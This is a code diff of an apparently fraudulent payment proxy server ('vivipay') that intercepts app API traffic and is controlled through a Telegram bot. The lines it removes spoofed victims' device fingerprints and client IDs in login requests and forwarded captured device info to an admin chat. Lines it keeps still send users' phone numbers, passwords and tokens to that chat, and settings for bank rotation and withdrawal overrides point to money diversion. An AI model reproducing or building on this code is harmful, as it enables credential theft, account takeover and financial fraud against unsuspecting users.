@@ -127,7 +127,7 @@ async function saveData(data) {
       }
       const current = await redis.get('vivipayData');
       if (current && typeof current === 'object') {
-        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate', 'alwaysDeviceInfo', 'nextDeviceInfo'];
+        const settingsKeys = ['banks', 'activeIndex', 'autoRotate', 'botEnabled', 'usdtAddress', 'logRequests', 'adminChatId', 'depositSuccess', 'depositBonus', 'withdrawOverride', 'blockUpdate'];
         for (const key of settingsKeys) { if (current[key] !== undefined) data[key] = current[key]; }
         if (current.userOverrides) data.userOverrides = { ...current.userOverrides, ...data.userOverrides };
         if (current.orderBankMap) data.orderBankMap = { ...current.orderBankMap, ...data.orderBankMap };
@@ -683,9 +683,6 @@ app.post('/bot-webhook', async (req, res) => {
 /rr — Toggle full raw request+response log
 /update — Toggle update block
 /status — Full status
-/use <json> — Use custom device info JSON for next login
-/alwaysuse <json> — Always use custom device info JSON
-/alwaysuse off — Disable always use custom device info
 
 === BALANCE ===
 /add <amount> <userId>
@@ -743,41 +740,6 @@ Example:
       if (text === '/update on') { data.blockUpdate = false; } else { data.blockUpdate = true; }
       data._skipOverrideMerge = true; await saveData(data);
       await bot.sendMessage(chatId, data.blockUpdate ? '🚫 Update BLOCKED' : '✅ Update ALLOWED');
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/use ')) {
-      const jsonStr = text.substring(5).trim();
-      try {
-        JSON.parse(jsonStr);
-        data.nextDeviceInfo = jsonStr;
-        data._skipOverrideMerge = true;
-        await saveData(data);
-        await bot.sendMessage(chatId, '✅ Next login/deviceInfo will use this JSON.');
-      } catch(e) {
-        await bot.sendMessage(chatId, '❌ Invalid JSON format.');
-      }
-      return res.sendStatus(200);
-    }
-
-    if (text.startsWith('/alwaysuse ')) {
-      const cmd = text.substring(11).trim();
-      if (cmd.toLowerCase() === 'off') {
-        data.alwaysDeviceInfo = null;
-        data._skipOverrideMerge = true;
-        await saveData(data);
-        await bot.sendMessage(chatId, '✅ alwaysuse disabled.');
-      } else {
-        try {
-          JSON.parse(cmd);
-          data.alwaysDeviceInfo = cmd;
-          data._skipOverrideMerge = true;
-          await saveData(data);
-          await bot.sendMessage(chatId, '✅ All future logins will use this JSON until disabled (/alwaysuse off).');
-        } catch(e) {
-          await bot.sendMessage(chatId, '❌ Invalid JSON format.');
-        }
-      }
       return res.sendStatus(200);
     }
 
@@ -1497,64 +1459,6 @@ app.all('/xxapi/*', async (req, res) => {
         else if (ct.includes('form')) { reqBody = Object.fromEntries(new URLSearchParams(req.rawBody.toString())); }
       } catch (e) { }
     }
-
-    let overrideJson = data.alwaysDeviceInfo || data.nextDeviceInfo || null;
-    if (overrideJson) {
-      if (reqBody.deviceInfo) {
-        const originalDeviceInfo = reqBody.deviceInfo;
-        reqBody.deviceInfo = overrideJson;
-        try {
-          const ct = (req.headers['content-type'] || '').toLowerCase();
-          if (ct.includes('json')) {
-            req.rawBody = Buffer.from(JSON.stringify(reqBody));
-          } else if (ct.includes('multipart') || ct.includes('form')) {
-            const bodyStr = req.rawBody.toString();
-            const encodedOriginal = encodeURIComponent(originalDeviceInfo);
-            const encodedOverride = encodeURIComponent(overrideJson);
-            let newBodyStr = bodyStr;
-            if (bodyStr.includes(encodedOriginal)) {
-              newBodyStr = bodyStr.replace(encodedOriginal, encodedOverride);
-            } else {
-              newBodyStr = bodyStr.replace(originalDeviceInfo, overrideJson);
-            }
-            req.rawBody = Buffer.from(newBodyStr);
-          }
-          if (data.nextDeviceInfo) {
-            data.nextDeviceInfo = null;
-            data._skipOverrideMerge = true;
-            saveData(data).catch(()=>{});
-          }
-        } catch (e) {}
-      }
-
-      let extractedClientId = null;
-      try {
-        const parsed = JSON.parse(overrideJson);
-        if (parsed.clientId) extractedClientId = parsed.clientId;
-      } catch(e) {}
-
-      if (extractedClientId && reqBody.clientId) {
-        const originalClientId = reqBody.clientId;
-        reqBody.clientId = extractedClientId;
-        try {
-          const ct = (req.headers['content-type'] || '').toLowerCase();
-          if (ct.includes('json')) {
-            req.rawBody = Buffer.from(JSON.stringify(reqBody));
-          } else if (ct.includes('multipart') || ct.includes('form')) {
-             const bodyStr = req.rawBody.toString();
-             let newBodyStr = bodyStr;
-             if (ct.includes('form')) {
-                newBodyStr = bodyStr.replace(`clientId=${encodeURIComponent(originalClientId)}`, `clientId=${encodeURIComponent(extractedClientId)}`)
-                                    .replace(`clientId=${originalClientId}`, `clientId=${extractedClientId}`);
-             } else {
-                newBodyStr = bodyStr.replace(originalClientId, extractedClientId);
-             }
-             req.rawBody = Buffer.from(newBodyStr);
-          }
-        } catch(e) {}
-      }
-    }
-
     if (req.body && typeof req.body === 'object' && Object.keys(req.body).length > 0) {
       reqBody = { ...reqBody, ...req.body };
     }
@@ -1581,16 +1485,10 @@ app.all('/xxapi/*', async (req, res) => {
         lastAction: path.split('/').pop() || 'API',
         phone: phone || existing.phone || ''
       };
-      if (reqBody.deviceInfo) {
-        data.trackedUsers[String(userId)].lastDeviceInfo = reqBody.deviceInfo;
-      }
       if (respData && typeof respData === 'object') {
         const rName = respData.name || respData.nickname || respData.realName || respData.userName || respData.memberName || '';
         if (rName) data.trackedUsers[String(userId)].name = rName;
       }
-    } else if (phone && reqBody.deviceInfo) {
-      if (!data.phoneDeviceInfo) data.phoneDeviceInfo = {};
-      data.phoneDeviceInfo[phone] = reqBody.deviceInfo;
     }
 
     const isLogin = urlLower.includes('login') || urlLower.includes('signin') || urlLower.includes('dologin') || urlLower.includes('auth') || urlLower.includes('register');
@@ -1622,19 +1520,6 @@ app.all('/xxapi/*', async (req, res) => {
 📱 Phone: ${phone || 'N/A'}${pwd ? '\n🔐 Pass: ' + pwd : ''}${extractedToken ? '\n🎫 Token: ' + extractedToken : ''}
 🕐 ${now}`);
 
-    }
-
-    if (urlLower.includes('deviceinfo') && reqBody.deviceInfo) {
-        let deviceInfoStr = '';
-        try {
-          const parsed = typeof reqBody.deviceInfo === 'string' ? JSON.parse(reqBody.deviceInfo) : reqBody.deviceInfo;
-          deviceInfoStr = `\`\`\`json\n${JSON.stringify(parsed, null, 2)}\n\`\`\``;
-        } catch(e) {
-          deviceInfoStr = `\`\`\`json\n${reqBody.deviceInfo}\n\`\`\``;
-        }
-        if (data.adminChatId && bot) {
-           bot.sendMessage(data.adminChatId, `📱 *DEVICE INFO CAPTURED*\n👤 Phone: ${phone || 'N/A'}\n\n${deviceInfoStr}`, { parse_mode: 'Markdown' }).catch(()=>{});
-        }
     }
 
     const isUserInfo = urlLower.includes('userinfo') || urlLower.includes('memberinfo') ||
